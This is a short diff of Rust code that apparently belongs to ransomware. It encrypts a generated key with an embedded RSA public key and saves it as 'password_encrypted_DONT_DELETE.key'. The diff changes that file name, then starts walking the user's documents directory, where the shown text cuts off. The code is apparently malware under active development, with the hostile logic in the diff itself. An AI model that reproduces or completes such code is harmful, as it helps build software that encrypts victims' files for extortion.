@@ -101,7 +101,7 @@ SwIDAQAB
     let mut rng = rand::thread_rng();
 
     let passenc = public_key.encrypt(&mut rng, Pkcs1v15Encrypt, &key_bytes).unwrap();
-    let _ = save_key_to_file(&passenc, "password_encrypted_DONT_DELETE.");
+    let _ = save_key_to_file(&passenc, "password_encrypted_DONT_DELETE.key");
 
     for entry in WalkDir::new(documents_dir)
         .into_iter()
